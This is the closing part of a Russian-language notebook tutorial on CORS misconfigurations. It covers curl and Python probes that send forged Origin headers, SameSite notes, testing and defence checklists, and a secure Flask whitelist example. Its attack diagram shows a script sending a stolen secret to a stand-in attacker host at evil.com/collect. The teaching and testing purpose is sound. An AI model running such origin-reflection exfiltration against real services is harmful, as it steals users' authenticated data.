# Замените https://example.com на свой API

# 1) Запрос с произвольным Origin
!curl -s -I -H "Origin: https://evil.com" https://example.com/api/ | grep -i "access-control"

# 2) Запрос с другим Origin
!curl -s -I -H "Origin: https://attacker.io" https://example.com/api/ | grep -i "access-control"

In [ ]:
# Python-скрипт для проверки CORS
# Отправляет запросы с разными Origin и анализирует ответ

import requests

def check_cors(url, origins=None, cookies=None):
    # Проверка CORS на указанном URL с разными Origin
    # url: тестируемый эндпоинт
    # origins: список Origin для теста
    # cookies: словарь куки для авторизованного запроса
    if origins is None:
        # Стандартный набор тестовых Origin
        origins = [
            "https://evil.com",                       # произвольный
            "https://example.com.evil.com",           # поддомен злоумышленника
            "https://evilexample.com",                # похожий домен
            "null",                                  # null origin (file://, sandbox)
            "https://example.com"                     # легитимный
        ]
    
    print(f"Target: {url}\n")
    print(f"{'Origin':<40} {'ACAO':<40} {'ACAC':<10} {'Vary':<20}")
    print("-" * 110)
    
    for origin in origins:
        # Заголовки запроса
        headers = {"Origin": origin}
        try:
            r = requests.get(url, headers=headers, cookies=cookies, timeout=10)
            acao = r.headers.get("Access-Control-Allow-Origin", "-")
            acac = r.headers.get("Access-Control-Allow-Credentials", "-")
            vary = r.headers.get("Vary", "-")
            print(f"{origin:<40} {acao:<40} {acac:<10} {vary:<20}")
            
            # Автоматический анализ
            if acao == "*" and acac == "true":
                print(f"  [!] КРИТИЧНО: *  + credentials true (браузер блокирует, но сервер уязвим)")
            elif acao == origin and acac == "true":
                print(f"  [!] КРИТИЧНО: отражение Origin + credentials true")
            elif acao == "*":
                print(f"  [?] Внимание: wildcard - проверьте, не отдаёт ли эндпоинт приватные данные")
            elif acao == origin:
                print(f"  [?] Внимание: отражение Origin без проверки whitelist")
        except Exception as e:
            print(f"{origin:<40} ERROR: {e}")

# Пример использования на локальном сервере жертвы (сценарий 2)
# Раскомментируйте, если запущен reflection_victim.py
# check_cors("http://localhost:5003/api/balance", cookies={"session": "bob_session"})

# Тест на публичном API для демонстрации работы скрипта
print("=== Демонстрация работы скрипта ===")
print("(запустите check_cors на локальном сервере или своём API)")

## 5.3. SameSite-атрибут куки

Даже если CORS настроен небезопасно, атака может не сработать, если кука имеет правильный атрибут `SameSite`.

| SameSite | Поведение                                                                       |
|----------|----------------------------------------------------------------------------------|
| `Strict` | Кука НЕ отправляется в кросс-доменных запросах вообще (даже по ссылке).           |
| `Lax`    | Кука отправляется только в top-level GET-запросах (переход по ссылке). Для fetch - НЕ отправляется. Это **современный дефолт** в большинстве браузеров. |
| `None`   | Кука отправляется во всех кросс-доменных запросах. **Требует `Secure=True`**.    |

**Вывод**: для сессионных кук лучше всего `SameSite=Lax` или `SameSite=Strict`. `SameSite=None; Secure` нужен только если реально требуется кросс-доменная авторизация (например, SSO между поддоменами), и при этом обязательна защита через HTTPS.

In [ ]:
# Демонстрация проверки SameSite на примере серверов жертвы

import requests

# Запрос на /login у reflection_victim - должна установиться кука
r = requests.get("http://localhost:5003/login")
print("Заголовки Set-Cookie от /login:")
for c in r.cookies:
    print(f"  name={c.name}, value={c.value}, samesite={c._rest.get('SameSite', 'не указан')}, secure={c.secure}")

# Анализ:
# Если SameSite=None и Secure=False -> кука в реальном браузере будет отклонена
# Если SameSite=None + Secure=True -> кука отправляется в кросс-доменных запросах
# Если SameSite=Lax (или не указан) -> кука НЕ будет отправлена в fetch с credentials:'include'
#   -> атака по CORS провалится, даже если сервер уязвим

## 5.4. Чек-лист тестирования CORS

1. Отправить запрос с произвольным Origin (`https://evil.com`). Если в ответе `ACAO: https://evil.com` - уязвимость.
2. Отправить запрос без Origin. Если в ответе всё равно есть `ACAO` - возможно кэширование.
3. Проверить наличие `Vary: Origin`. Если отсутствует при динамическом ACAO - риск отравления кэша.
4. Проверить `Access-Control-Allow-Credentials: true`. Если есть + динамический ACAO - критическая уязвимость.
5. Проверить атрибут `SameSite` сессионной куки. Если `None` без `Secure` - браузер отклонит.
6. Проверить null Origin. Некоторые серверы ошибочно доверяют `null` (например, при `file://` или sandbox iframe).

# 6. Рекомендации по защите и best practices

Краткий набор конкретных рекомендаций.

## 6.1. Чек-лист защиты

- **Никогда не используйте `Access-Control-Allow-Origin: *` для эндпоинтов с чувствительными данными или аутентификацией.**
  Опасно само по себе, а сочетание с `Access-Control-Allow-Credentials: true` делает сервер уязвимым даже с учётом защиты браузера (например, при IP-привязке сессий). Используйте явный whitelist доверенных доменов.

- **Всегда валидируйте Origin строго по whitelist, а не по подстроке или регэкспу.**
  Проверка `if "company.com" in origin` пропустит `evilcompany.com` и `company.com.evil.com`. Используйте точное сравнение с заранее известным списком разрешённых origin.

- **Точно понимайте, какие эндпоинты должны поддерживать CORS, а какие - нет.**
  Большинство backend-API не нуждаются в CORS вообще (если фронтенд на том же origin). Для публичных read-only API CORS можно открыть, для эндпоинтов с аутентификацией - только конкретные домены вашего фронтенда.

- **Используйте корректные настройки SameSite для чувствительных куки.**
  `SameSite=Lax` или `Strict` для сессионных куки. `SameSite=None` только если кросс-доменная авторизация действительно необходима, и обязательно с `Secure=True`.

- **Всегда добавляйте `Vary: Origin`, если ACAO возвращается динамически.**
  Без этого CDN или прокси могут закэшировать ответ с одним ACAO и отдать его другому origin, что приведёт к утечке или к ошибкам доступа.

- **Не доверяйте `null` Origin.**
  `Origin: null` может быть отправлен браузером для `file://`, песочниц, data: URLs. Включайте `null` в whitelist только если точно понимаете, зачем.

- **Регулярно проверяйте конфигурацию CORS автоматически.**
  Добавьте в CI/CD тесты, которые отправляют запросы с тестовыми Origin и проверяют, что сервер не возвращает неожидаемые ACAO/ACAC.

- **Помните, что CORS - это защита браузера, не сервера.**
  Сервер не должен полагаться на CORS для разграничения доступа. Любой non-browser клиент (curl, Python-скрипт, мобильное приложение) проигнорирует CORS. Реальная авторизация должна быть на сервере.

## 6.2. Пример безопасной конфигурации

Эталонная реализация проверки Origin на сервере:

In [ ]:
# Безопасная конфигурация CORS на Flask

from flask import Flask, request, jsonify, make_response
from urllib.parse import urlparse

app = Flask(__name__)

# Whitelist разрешённых origin - ТОЧНОЕ совпадение, без подстрок
ALLOWED_ORIGINS = {
    "https://app.bank.com",        # продакшен фронтенд
    "https://staging.app.bank.com", # стейджинг
    "http://localhost:3000"         # локальная разработка
}

def get_cors_headers(origin):
    # Возвращает словарь CORS-заголовков, если origin разрешён
    headers = {}
    if origin in ALLOWED_ORIGINS:
        # Точное совпадение - разрешаем
        headers["Access-Control-Allow-Origin"] = origin
        headers["Access-Control-Allow-Credentials"] = "true"
        headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
        headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
        # Vary: Origin обязателен для динамического ACAO
        headers["Vary"] = "Origin"
    return headers

@app.before_request
def handle_preflight():
    # Обработка OPTIONS-запросов (preflight)
    if request.method == "OPTIONS":
        origin = request.headers.get("Origin", "")
        headers = get_cors_headers(origin)
        if not headers:
            # Если origin не разрешён - возвращаем 403
            return "Forbidden", 403
        resp = make_response()
        for k, v in headers.items():
            resp.headers[k] = v
        return resp

@app.after_request
def add_cors_headers(resp):
    # Добавление CORS-заголовков к каждому ответу
    origin = request.headers.get("Origin", "")
    headers = get_cors_headers(origin)
    for k, v in headers.items():
        resp.headers[k] = v
    return resp

@app.route("/api/secret")
def secret():
    # Эндпоинт с секретными данными
    # CORS уже настроен глобально через @app.after_request
    return jsonify({"secret": "only-for-allowed-origins"})

# Эта конфигурация:
# 1) Разрешает только конкретные origin
# 2) Не использует wildcard
# 3) Корректно обрабатывает preflight
# 4) Добавляет Vary: Origin для корректного кэширования
print("Безопасная конфигурация загружена")

# 7. Формат комментариев в коде

Все комментарии в этом блокноте следуют единым правилам:

1. **Только русский язык** - и в коде, и в markdown.
2. **Комментарии объясняют "зачем", а не только "что"**:
   - Плохо: `# устанавливаем заголовок`
   - Хорошо: `# Устанавливаем ACAO, что приводит к уязвимости CORS`
3. **Прямо указывают место уязвимости**:
   - `# ВНИМАНИЕ: здесь происходит уязвимость`
   - `# УЯЗВИМОСТЬ: отражение Origin без проверки`
4. **Объясняют действия браузера**:
   - `# Браузер автоматически добавляет Origin`
   - `# Браузер проверяет ACAO перед передачей ответа скрипту`
5. **Достаточно подробны**, чтобы код был понятен без внешней документации.

Примеры корректных комментариев из блокнота:

In [ ]:
# Примеры формата комментариев

# Этот эндпоинт возвращает секретные данные (токен пользователя)
# В этой строке мы устанавливаем заголовок Access-Control-Allow-Origin, что приводит к уязвимости CORS
# Браузер отправляет заголовок Origin со значением домена злоумышленника
# Злоумышленник может прочитать ответ, потому что сервер вернул его origin в ACAO

# Серверная проверка:
origin = 'https://evil.com'  # имитируем origin злоумышленника
# УЯЗВИМОСТЬ: возвращаем любой Origin без проверки whitelist
acao_header = origin
# В сочетании с credentials:true это даёт атакующему полный доступ
acac_header = 'true'

print(f"ACAO: {acao_header}")
print(f"ACAC: {acac_header}")

# 8. Иллюстрации и схемы

Сводка диаграмм, использованных в блокноте, и дополнительные схемы.

## 8.1. Same-Origin Policy (SOP)

Браузер по умолчанию запрещает скриптам читать ответы кросс-доменных запросов:

```
         Скрипт на evil.com                bank.com
                |                              |
                |  fetch('bank.com/api/me')    |
                |----------------------------->|
                |                              |
                |       200 OK + данные         |
                |<-----------------------------|
                |                              |
                |  Браузер: "Origin не совпадает|
                |   с bank.com - блокирую"     |
                |  скрипт НЕ получает данные   |
```

SOP - это защита по умолчанию. CORS - контролируемое исключение из неё.

## 8.2. Успешная атака через уязвимый CORS

```
  Жертва (браузер)            evil.com                 bank.com (уязвимый)
        |                         |                            |
        |  1. Открывает evil.com  |                            |
        |------------------------>|                            |
        |  2. Получает HTML+JS    |                            |
        |<------------------------|                            |
        |                         |                            |
        |  3. JS: fetch(bank.com/api/me, {credentials:'include'})
        |----------------------------------------------------->|
        |  Origin: https://evil.com                            |
        |  Cookie: session=USER_SESSION                        |
        |                         |                            |
        |                         |   4. Сервер: "Origin есть в |
        |                         |      запросе - верну его"  |
        |                         |      (УЯЗВИМОСТЬ)          |
        |                         |                            |
        |  5. Ответ:                                          |
        |     Access-Control-Allow-Origin: https://evil.com   |
        |     Access-Control-Allow-Credentials: true          |
        |     { user: "alice", secret: "FLAG{...}" }           |
        |<-----------------------------------------------------|
        |                         |                            |
        |  6. Браузер: ACAO совпадает с origin, credentials OK
        |     -> отдаёт ответ скрипту                          |
        |                         |                            |
        |  7. JS: получил секрет                               |
        |     fetch('evil.com/collect', {body: secret})        |
        |------------------------>|                            |
        |                         |  8. Атакующий сохранил    |
        |                         |     секрет                |
```

**Ключевые моменты схемы:**

- Инициатор запроса - **скрипт в браузере жертвы** (запускается страницей `evil.com`).
- Браузер автоматически добавляет `Origin` и (при `credentials:'include'`) куку.
- Уязвимый сервер отражает `Origin` в `ACAO` без проверки.
- Браузер видит совпадение Origin и ACAO, разрешает чтение ответа.
- Скрипт эксфильтрирует данные на сервер злоумышленника.

## 8.3. Preflight-запрос (OPTIONS)

```
    Браузер                    Сервер жертвы
       |                            |
       | -- OPTIONS /api -->        |
       |    Origin: https://evil    |
       |    Access-Control-Request-Method: POST
       |    Access-Control-Request-Headers: Content-Type
       |                            |
       | <-- 200 OK --              |
       |    Access-Control-Allow-Origin: https://evil
       |    Access-Control-Allow-Methods: GET, POST, PUT
       |    Access-Control-Allow-Headers: Content-Type
       |    Access-Control-Max-Age: 3600
       |                            |
       | (если preflight успешен)   |
       | -- POST /api -->           |
       |    Origin: https://evil    |
       |    Cookie: session=...     |
       |    Content-Type: app/json  |
       |    Body: { ... }           |
       |                            |
       | <-- 200 OK --              |
       |    ACAO: https://evil      |
       |    Body: { result: ... }   |
```

Preflight нужен, чтобы сервер мог отклонить "опасный" запрос (с кастомными заголовками или методом) до того, как он будет отправлен.

## 8.4. Сводка диаграмм блокнота

| Раздел | Тип диаграммы | Что показывает |
|--------|---------------|----------------|
| 1.4    | ASCII-схема   | Базовое взаимодействие браузер - жертва - атакующий с заголовками |
| 1.5    | ASCII-схема   | Preflight-запрос (OPTIONS) перед основным запросом |
| 8.1    | ASCII-схема   | Same-Origin Policy - блокировка по умолчанию |
| 8.2    | ASCII-схема   | Полный сценарий атаки с пронумерованными шагами |
| 8.3    | ASCII-схема   | Preflight-обмен с заголовками ACAM/ACAH |

Все схемы сопровождаются текстовым объяснением: кто инициирует запрос, какие заголовки устанавливаются, как ответ возвращается.

---

## Заключение

В этом блокноте мы разобрали:

1. **Теория CORS**: Origin, Same-Origin Policy, ключевые заголовки (`ACAO`, `ACAC`, `ACAM`, `ACAH`, `Vary: Origin`).
2. **Мини-лаборатория**: сервер жертвы и сервер злоумышленника на Flask, запуск через ngrok.
3. **Типовые уязвимости**: wildcard с чувствительными данными, отражение Origin, whitelist по подстроке.
4. **Практическая эксплуатация**: два пошаговых сценария атаки с кодом и анализом заголовков.
5. **Инструменты обнаружения**: curl-команды и Python-скрипт для проверки CORS, учёт SameSite.
6. **Best practices**: whitelist по точному совпадению, `Vary: Origin`, корректные SameSite-настройки.

Главный вывод: **CORS - это защита браузера, а не сервера**. Сервер должен самостоятельно валидировать Origin и не полагаться на то, что браузер что-то "запретит". Любая конфигурация с динамическим `Access-Control-Allow-Origin` без строгого whitelist - это потенциальная критическая уязвимость.